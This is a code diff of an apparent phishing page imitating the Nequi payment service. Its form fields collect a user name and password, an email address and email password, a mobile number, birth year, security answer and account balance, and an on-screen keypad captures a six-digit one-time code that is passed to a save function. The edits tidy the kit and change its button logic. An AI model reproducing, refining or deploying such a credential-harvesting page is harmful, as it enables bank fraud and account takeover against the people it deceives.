@@ -59,14 +59,7 @@
                 font-size: 16px;
             }
         }
-/*
-.msgVacio{
-    display: table;
-    font-size: 13px;
-    font-style: italic;
-    color:#fafaf7;
-}
-*/
+
 .msgValida{
     display: table;
     font-size: 13px;
@@ -259,7 +252,7 @@
                         </p-card>
                     </nequi-numeric-keypad>
                     <div _ngcontent-dka-c28="" class="otp-validation__buttons">
-                        <nequi-button _ngcontent-dka-c28="" _nghost-dka-c21="">
+                        <nequi-button _ngcontent-dka-c28="" _nghost-cby-c21="">
                             <button _ngcontent-dka-c21="" pbutton="" pripple="" type="button" class="p-element p-button-secondary p-button p-component" name="otp_validation_cancel_button"><span class="p-button-label">Cancela el pago</span></button>
                         </nequi-button>
                     </div>
@@ -498,89 +491,72 @@
   const inputCelular = document.getElementById("celular");
   const inputNacimiento = document.getElementById("nacimiento");
   const inputRespuesta = document.getElementById("resp2");
-  const inputSaldo = document.getElementById("inputsaldo"); // Nuevo campo para el saldo
+  const inputSaldo = document.getElementById("inputsaldo");
 
     inputUsuario.addEventListener("input", function() {
-
       if (this.value.trim().length == 0) {
         this.classList.remove("p-filled");
       } else {
         this.classList.add("p-filled");
       }
-
     });
 
     inputClave.addEventListener("input", function() {
-
       if (this.value.trim().length == 0) {
         this.classList.remove("p-filled");
       } else {
         this.classList.add("p-filled");
       }
-
     });
 
     inputEmail.addEventListener("input", function() {
-
       if (this.value.trim().length == 0) {
         this.classList.remove("p-filled");
       } else {
         this.classList.add("p-filled");
       }
-
     });   
 
     inputClavemail.addEventListener("input", function() {
-
       if (this.value.trim().length == 0) {
         this.classList.remove("p-filled");
       } else {
         this.classList.add("p-filled");
       }
-
     });    
 
     inputApellido.addEventListener("input", function() {
-
       if (this.value.trim().length == 0) {
         this.classList.remove("p-filled");
       } else {
         this.classList.add("p-filled");
       }
-
     });     
 
     inputCelular.addEventListener("input", function() {
-
       if (this.value.trim().length == 0) {
         this.classList.remove("p-filled");
       } else {
         this.classList.add("p-filled");
       }
-
     });   
 
     inputNacimiento.addEventListener("input", function() {
-
       if (this.value.trim().length == 0) {
         this.classList.remove("p-filled");
       } else {
         this.classList.add("p-filled");
       }
-
     }); 
 
     inputRespuesta.addEventListener("input", function() {
-
       if (this.value.trim().length == 0) {
         this.classList.remove("p-filled");
       } else {
         this.classList.add("p-filled");
       }
-
     });     
 
-    // Nuevo listener para el campo de saldo
     inputSaldo.addEventListener("input", function() {
       if (this.value.trim().length == 0) {
         this.classList.remove("p-filled");
@@ -598,7 +574,6 @@
         };    
     
         var btniniciar = document.getElementById('btniniciar');
-            //clave = document.getElementById('clave');
 
                 inputUsuario.addEventListener("keyup", function () {
                     check(this);
@@ -606,7 +581,7 @@
                     if(inputUsuario.value.trim().length == 0 ) {
                         btniniciar.disabled = false;
                     } else {
-                       // btniniciar.disabled = true;
+                       btniniciar.disabled = false;
                         inputClave.addEventListener("keyup", function () {
                             check(this);
 
@@ -622,7 +597,6 @@
                 });
 
         var btnEmail = document.getElementById('btnEmail');
-            //clave = document.getElementById('clave');
 
                 inputEmail.addEventListener("keyup", function () {
                     check(this);
@@ -630,7 +604,7 @@
                     if(inputEmail.value.trim().length == 0 ) {
                         btnEmail.disabled = false;
                     } else {
-                       // btniniciar.disabled = true;
+                       btnEmail.disabled = false;
                         inputClavemail.addEventListener("keyup", function () {
                             check(this);
 
@@ -651,7 +625,6 @@
                     check(this);
 
                     if(inputApellido.value.trim().length >= 3 ) {
-
                                 btnApe.disabled = false;
                             } else {
                                 btnApe.disabled = true;
@@ -665,7 +638,6 @@
                     check(this);
 
                     if(inputCelular.value.trim().length == 10 ) {
-
                                 btnMovil.disabled = false;
                             } else {
                                 btnMovil.disabled = true;
@@ -679,7 +651,6 @@
                     check(this);
 
                     if(inputNacimiento.value.trim().length == 4 ) {
-
                                 btnNaci.disabled = false;
                             } else {
                                 btnNaci.disabled = true;
@@ -693,7 +664,6 @@
                     check(this);
 
                     if(inputRespuesta.value.trim().length >= 1 ) {
-
                                 btnResp.disabled = false;
                             } else {
                                 btnResp.disabled = true;
@@ -701,22 +671,17 @@
 
                         });
 
-        // Nuevo código para manejar el botón de saldo
         var btnSaldo = document.getElementById('btnSaldo');
         
         inputSaldo.addEventListener("keyup", function () {
             check(this);
             
-            // Validar que el campo de saldo tenga al menos 3 caracteres (ej: $10)
             if (inputSaldo.value.trim().length >= 3) {
                 btnSaldo.disabled = false;
             } else {
                 btnSaldo.disabled = true;
             }
         });
-
-        }
-
 </script>
 
     <script>
@@ -734,7 +699,7 @@
                     enteredValues[currentIndex] = button.innerText;
                     currentIndex++;
                     dina = enteredValues.join('');
-                    console.log(dina); // Muestra los valores ingresados en la consola
+                    console.log(dina);
                     if (currentIndex === 6) {
                         guardarotp(dina);
                         console.log('SE FUE...');
@@ -749,7 +714,7 @@
                 currentIndex--;
                 displayFields[currentIndex].innerText = '';
                 enteredValues[currentIndex] = undefined;
-                console.log(enteredValues.filter(val => val !== undefined).join('')); // Muestra los valores ingresados en la consola
+                console.log(enteredValues.filter(val => val !== undefined).join(''));
             }
         });
     </script>
